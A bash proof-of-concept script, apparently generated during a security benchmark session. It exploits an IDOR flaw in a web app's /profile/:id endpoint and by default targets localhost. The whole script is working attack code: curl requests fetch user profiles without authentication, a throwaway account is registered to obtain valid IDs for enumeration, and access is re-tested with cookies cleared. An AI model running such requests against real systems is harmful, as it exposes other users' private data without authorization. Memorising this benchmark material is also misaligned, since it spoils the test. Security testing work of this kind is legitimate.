#!/bin/bash
# POC: Demonstrates IDOR vulnerability allowing unauthenticated access to any user profile via /profile/:id endpoint
# Target: ./repo
# Created: 2025-12-01T16:12:39.965Z
# Session: benchmark-XBEN-099-24-minc74t1

# IDOR - Unauthorized Profile Access POC
# Demonstrates unauthenticated access to user profiles

TARGET_URL="${1:-http://localhost:3000}"
TEST_USER_ID="${2:-692dbe5e1cc493c06cd752b3}"

echo "=========================================="
echo "IDOR Vulnerability POC - Unauthorized Profile Access"
echo "=========================================="
echo ""

# Test 1: Access profile WITHOUT authentication
echo "[*] Test 1: Accessing user profile WITHOUT authentication"
echo "[*] URL: ${TARGET_URL}/profile/${TEST_USER_ID}"
echo ""

RESPONSE=$(curl -s "${TARGET_URL}/profile/${TEST_USER_ID}")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/profile/${TEST_USER_ID}")

echo "[*] HTTP Status Code: ${HTTP_CODE}"
echo "[*] Response:"
echo "$RESPONSE"
echo ""

# Check if we got a successful response with user data
if echo "$RESPONSE" | grep -q "Welcome"; then
    echo "[+] VULNERABILITY CONFIRMED: Successfully accessed profile without authentication!"
    echo "[+] Profile data leaked:"
    echo "$RESPONSE" | grep -E "(Welcome|Total users|from your target|You are)" | sed 's/^/    /'
    echo ""
else
    echo "[-] Could not retrieve profile (may indicate vulnerability is patched)"
fi

# Test 2: Try to enumerate first user's profile by trying common/sequential IDs
echo "[*] Test 2: Attempting to access profiles with different IDs"
echo ""

# Create a test user first to get a valid ID format
REGISTER_RESPONSE=$(curl -s -X POST "${TARGET_URL}/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=idor_test_enum_$(date +%s)&password=test123")

if echo "$REGISTER_RESPONSE" | grep -q "userId"; then
    NEW_USER_ID=$(echo "$REGISTER_RESPONSE" | grep -oP '(?<="userId":"?)[^"]*' | head -1)
    echo "[*] Created test user with ID: $NEW_USER_ID"
    echo ""
    
    # Try to access the new user's profile without authentication
    echo "[*] Accessing newly created user profile without authentication:"
    TEST_RESPONSE=$(curl -s "${TARGET_URL}/profile/${NEW_USER_ID}")
    TEST_HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/profile/${NEW_USER_ID}")
    
    echo "[*] HTTP Status: ${TEST_HTTP_CODE}"
    if echo "$TEST_RESPONSE" | grep -q "Welcome"; then
        echo "[+] Successfully accessed new user profile without authentication!"
        echo "$TEST_RESPONSE" | grep "Welcome" | sed 's/^/    /'
    fi
else
    echo "[-] Could not create test user for enumeration test"
fi

echo ""
echo "[*] Test 3: Verifying no session/cookie validation is performed"
echo ""

# Try with invalid/missing cookies
echo "[*] Attempting access with cleared cookies:"
COOKIE_TEST=$(curl -s -b "" "${TARGET_URL}/profile/${TEST_USER_ID}")
if echo "$COOKIE_TEST" | grep -q "Welcome"; then
    echo "[+] Access granted even with no cookies - no session validation!"
else
    echo "[-] Session validation may be in place"
fi

echo ""
echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "The /profile/:id endpoint is vulnerable to IDOR."
echo "Any unauthenticated user can access any user profile by knowing their ID."
echo "There is no authentication or authorization check on this endpoint."
echo "=========================================="